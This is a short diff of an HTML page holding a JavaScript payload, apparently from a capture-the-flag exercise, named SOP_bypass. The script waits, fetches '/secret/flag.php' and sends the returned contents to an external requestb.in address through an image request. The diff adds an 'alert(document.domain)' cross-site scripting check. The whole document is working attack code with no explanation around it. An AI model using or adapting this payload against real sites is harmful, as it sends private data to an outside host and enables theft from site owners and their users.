@@ -1,6 +1,7 @@
 <html>
 <body>
 <script>
+alert(document.domain);
   setTimeout(function SOP_bypass() {
     $.get('/secret/flag.php', function(data) {
         // action with data
@@ -8,6 +9,7 @@
         image.src='http://requestb.in/14tl3qr1?flag='+data;
     });
 }, 1800000);
+
 </script>
 </body>
 </html>
